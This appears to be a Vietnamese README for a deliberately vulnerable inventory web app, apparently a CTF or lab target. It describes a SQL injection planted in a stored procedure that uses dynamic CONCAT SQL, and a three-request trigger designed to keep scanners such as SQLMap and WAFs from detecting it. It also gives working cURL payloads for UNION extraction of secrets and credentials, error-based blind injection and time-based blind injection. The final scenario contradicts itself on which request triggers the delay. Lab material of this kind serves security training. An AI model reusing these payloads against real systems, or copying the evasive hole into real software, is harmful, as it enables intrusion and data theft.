# StockFlow - Hệ Thống Quản Lý Kho & Lỗ Hổng Stored Procedure SQLi

Ứng dụng web quản lý sản phẩm / kho hàng thực tế được đóng gói toàn diện bằng **Docker Compose** với giao diện **React (Tailwind CSS)**, backend **Node.js (Express)** và database **MariaDB**.

---

## 1. Khởi Động Nhanh Bằng Docker Compose

Yêu cầu máy tính đã cài đặt **Docker Desktop** (hoặc Docker Engine).

Mở terminal tại thư mục dự án và chạy:

```bash
docker compose up --build -d
```

Sau khi các container khởi động thành công:
- **Giao diện Web (Frontend React)**: [http://localhost:3000](http://localhost:3000)
- **API Backend (Express)**: [http://localhost:5000/api/products](http://localhost:5000/api/products)
- **Database (MariaDB)**: `localhost:3306` (user: `root`, password: `secret123`, db: `inventory_db`)

Để dừng và xóa container:
```bash
docker compose down
```

---

## 2. Các Tính Năng Nghiệp Vụ Chuẩn (CRUD)
- **Xem danh sách (Read):** Hiển thị bảng sản phẩm, tính toán tự động tổng số lượng tồn kho và tổng giá trị kho hàng.
- **Lọc danh mục (Filter):** Phân loại theo Electronics, Accessories, Furniture, Kitchenware...
- **Thêm sản phẩm mới (Create):** Nút *"Thêm Mới"* mở Modal có validation.
- **Chỉnh sửa sản phẩm (Update):** Biểu tượng bút sửa mở Modal tải dữ liệu cũ.
- **Xóa sản phẩm (Delete):** Hộp thoại xác nhận trước khi xóa vĩnh viễn.

---

## 3. Cơ Chế Lỗ Hổng Stored Procedure Tinh Vi (Single-Query Memoization & 3-Hit Threshold)

### Tại sao cần gọi lặp lại 3 lần mới kích hoạt Stored Procedure?
1. **Tiết kiệm tài nguyên tuyệt đối (Zero Storage Waste):**
   - Hệ thống không lưu trữ tràn lan bảng log tìm kiếm. Bảng `search_cache_state` **luôn luôn chỉ duy trì đúng 1 dòng duy nhất** (`id = 1`) lưu câu truy vấn đang được theo dõi gần nhất.
2. **Ngưỡng kích hoạt thực tế (3-Hit Threshold):**
   - **Lần 1 & Lần 2 (Chế độ Tiêu Chuẩn):** Khi người dùng gửi truy vấn, Backend chỉ chạy câu lệnh Prepared Statement an toàn (`SELECT ... WHERE name LIKE ?`) để tiết kiệm tài nguyên. Bộ đếm tăng dần: `1/3 -> 2/3`.
   - **Lần 3 trở lên (Kích hoạt Stored Procedure):** Khi cùng một câu truy vấn được gọi liên tiếp đủ **3 lần**, Backend xác nhận đây là truy vấn có nhu cầu tra cứu chuyên sâu và chuyển sang gọi Stored Procedure:
     `CALL sp_deep_search_products(?)`
   - Bên trong `sp_deep_search_products`, truy vấn được xây dựng bằng **Dynamic SQL (ghép chuỗi `CONCAT`)**, từ đó kích hoạt lỗ hổng SQL Injection!
3. **Reset khi đổi từ khóa:**
   - Nếu đổi sang truy vấn khác trước khi đạt 3 lần, bộ đếm lập tức reset về 1 cho truy vấn mới.
   - Các công cụ quét tự động (WAF, Acunetix, SQLMap) khi thử hàng ngàn payload khác nhau sẽ luôn bị kẹt ở nhánh an toàn lần 1 (1/3 hits) và không bao giờ chạm tới Stored Procedure!

---

## 4. Hướng Dẫn Thử Nghiệm Khai Thác Bằng cURL

### Kịch bản 1: UNION SQLi trích xuất dữ liệu nhạy cảm bảng `system_secrets`

Lệnh cURL:
```bash
curl -s "http://localhost:5000/api/products?search=%25%27+UNION+SELECT+1%2Csecret_key%2Csecret_val%2C999%2C1%2Cdescription%2CNOW%28%29+FROM+system_secrets+--+-"
```

- **Lần 1 & 2:** Trả về `{ "success": true, "data": [] }` (Chạy Prepared Statement an toàn).
- **Lần 3:** Âm thầm kích hoạt Stored Procedure! Toàn bộ FLAG, ADMIN_TOKEN, S3 Credentials từ bảng `system_secrets` sẽ đổ về danh sách sản phẩm.

---

### Kịch bản 2: Boolean-based / Error Blind SQLi (Không để lộ chi tiết lỗi DB)

Lệnh cURL với điều kiện gây lỗi cú pháp nếu đúng:
```bash
curl -s "http://localhost:5000/api/products?search=%25%27+AND+%28INVALID+SYNTAX"
```

- **Lần 1 & 2:** Trả về `{ "success": true, "data": [] }` (Do câu lệnh an toàn bỏ qua lỗi).
- **Lần 3:** Hệ thống kích hoạt Stored Procedure và trả về lỗi generic chuẩn Production:
  ```json
  {
    "success": false,
    "error": "Internal Server Error"
  }
  ```
- Kỹ thuật viên có thể dựa vào sự khác biệt giữa HTTP 200 (True) và HTTP 500 (False) để trích xuất từng byte dữ liệu (Conditional Error Blind SQLi).

---

### Kịch bản 3: Time-Based Blind SQLi

Lệnh cURL:
```bash
curl -s "http://localhost:5000/api/products?search=notexist%27+OR+SLEEP%282%29+--+-"
```

- **Lần 1 & 2:** Phản hồi tức thì (~0.05s).
- **Lần 3:** Server trễ đúng 2 giây do hàm `SLEEP(2)` được kích hoạt bên trong Stored Procedure.

- **Gửi lần 2:**
  ```bash
  curl -s "http://localhost:5000/api/products?search=notexist%27+OR+SLEEP%282%29+--+-"
  ```
  *(Server trễ rõ rệt do hàm SLEEP được thực thi bên trong Stored Procedure).*
